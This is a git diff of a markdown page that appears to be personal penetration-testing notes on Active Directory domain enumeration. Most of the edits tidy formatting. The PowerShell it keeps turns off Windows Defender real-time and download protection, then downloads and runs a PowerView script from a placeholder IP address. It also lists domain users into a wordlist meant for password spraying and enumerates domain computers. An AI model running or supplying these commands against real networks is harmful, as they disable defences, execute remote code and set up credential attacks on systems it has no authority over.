@@ -12,17 +12,13 @@ permalink: /brainbox/
 
 ### DOMAIN ENUMERATION
  # Patch AMSI or disable AV
-    <br>
 ```powershell
       Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
       iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_DeV.ps1')
 ```
  <br>
-# Get all the users in the domain
 
-
-# Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying 
-    ```powershell
+```powershell
       Get-NetUsers | select samaccountname > username.txt
       
       # Get all the computers in the domain
@@ -30,8 +26,7 @@ permalink: /brainbox/
 
       # Get information about specific computer
       Get-NetComputer -Identity <computer_name>
-
-    ```
+```
 
 
 
